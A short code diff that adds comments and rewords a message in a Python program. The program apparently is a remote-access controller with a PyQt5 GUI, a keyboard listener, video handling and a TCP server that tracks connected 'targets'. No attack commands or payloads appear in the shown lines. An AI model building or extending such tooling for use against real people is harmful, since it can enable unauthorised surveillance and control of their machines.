@@ -39,6 +39,8 @@ video_thread = None
 
 
 
+""" PYQT5 Gui Class """
+
 class MyMainWindow(QtWidgets.QMainWindow):
     
     def __init__(self):
@@ -59,10 +61,10 @@ class MyMainWindow(QtWidgets.QMainWindow):
             self.Output.clear()
             self.Output.addItem(f"{VERSION} \t\t\t\t\t          {ip}")
         except Exception as e:
-            print("Could not retrieve address!")
+            print("Could not retrieve Users IP!")
 
     
-    """GUI method for retrieving commands"""
+    """ GUI method for retrieving commands """
 
     def get_command(self):
         global video_thread, ip
@@ -104,6 +106,9 @@ class MyMainWindow(QtWidgets.QMainWindow):
         with Listener(on_press=on_press) as listener:
             listener.join()
 
+
+
+""" Class for handling asynchronous TCP-connections """
 
 class ConnectionHandler(asyncore.dispatcher_with_send):
 
@@ -160,6 +165,10 @@ class ConnectionHandler(asyncore.dispatcher_with_send):
         connections.pop(self.id)
         self.window.Output.addItem(f"{time.strftime('%H:%M:%S')}  Target {repr(self.addr)} lost connection to the server.")
 
+
+
+
+""" Asynchronous Server class """
  
 class Server(asyncore.dispatcher):
 
